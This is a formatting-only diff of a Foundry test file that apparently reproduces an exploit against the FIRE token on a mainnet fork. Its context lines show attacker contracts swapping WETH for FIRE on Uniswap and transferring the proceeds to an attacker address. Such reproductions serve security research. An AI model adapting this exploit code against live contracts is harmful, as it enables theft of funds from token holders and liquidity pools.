@@ -26,7 +26,7 @@ contract FireToken_exp is Test {
     address attacker = makeAddr("attacker");
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 20869375 - 1);
+        vm.createSelectFork("mainnet", 20_869_375 - 1);
     }
 
     function testPoC() public {
@@ -36,7 +36,7 @@ contract FireToken_exp is Test {
 
         attackerC.attack();
 
-        console.log('Final balance in WETH:', attacker.balance);
+        console.log("Final balance in WETH:", attacker.balance);
     }
 }
 
@@ -77,7 +77,7 @@ contract AttackerC {
         return true;
     }
 
-    receive() external payable{}
+    receive() external payable {}
 }
 
 contract AttackerC2 {
@@ -90,11 +90,7 @@ contract AttackerC2 {
         path[0] = weth;
         path[1] = FIRE;
         IFS(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            20 ether,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            20 ether, 0, path, address(this), block.timestamp
         );
 
         uint256 pairBal = IFS(FIRE).balanceOf(UniPairWETHFIRE);
@@ -109,7 +105,7 @@ contract AttackerC2 {
         IERC20(weth).transfer(msg.sender, balWETH);
     }
 
-    receive() external payable{}
+    receive() external payable {}
 }
 
 interface IFS is IERC20 {
@@ -123,21 +119,27 @@ interface IFS is IERC20 {
     ) external;
 
     // WETH
-    function withdraw(uint256) external;
+    function withdraw(
+        uint256
+    ) external;
     function deposit() external payable;
 
     // UniswapV2Router02
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
+        uint256 deadline
     ) external;
-    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
+    function getAmountOut(
+        uint256 amountIn,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) external pure returns (uint256 amountOut);
 
     // UniswapV2Pair
     function token0() external view returns (address);
     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
 }
